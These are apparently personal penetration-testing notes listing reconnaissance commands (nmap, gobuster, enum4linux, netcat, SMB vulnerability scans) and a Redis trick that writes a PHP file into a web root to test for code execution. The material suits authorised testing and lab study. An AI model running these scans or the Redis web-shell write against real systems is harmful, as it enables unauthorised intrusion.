## Initial Enumeration
### Nmap
```
nmap -sS -sC -oN initial_scan.txt {IP}  
nmap -sS -p- -oN all_ports.txt {IP}
```
### Gobuster 
```
gobuster dir -u http://url -w /location/wordlist/file.txt  
gobuster vhost -u http://url -w /location/wordlist/file.txt  

/usr/share/seclists/Discovery/Web-Content/common.txt  
/usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
```
### Enum4Linux
```
enum4linux -e options http://[ip]
```

### HTTP Request 
```
Using Netcat
nc <target ip> 80

This will connect to the webserver which will allow you to send a request command

Head / HTTP/1.0

Hit enter twice as all headers have two spaces between them and the request. This should then 
return the Header of the request

```
### SMB 
```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.189.42 192.168.189.42  

showmount -e 10.10.10.10  

smbclient -L 10.10.10.10

```
### Redis

```
Redis - 6379
nmap --script redis-info -sV -p 6379 <IP>

To check if the db is able to apply Server side execution run the following, then try to run the file from the browser.
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK

>info 
>get config *

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
```

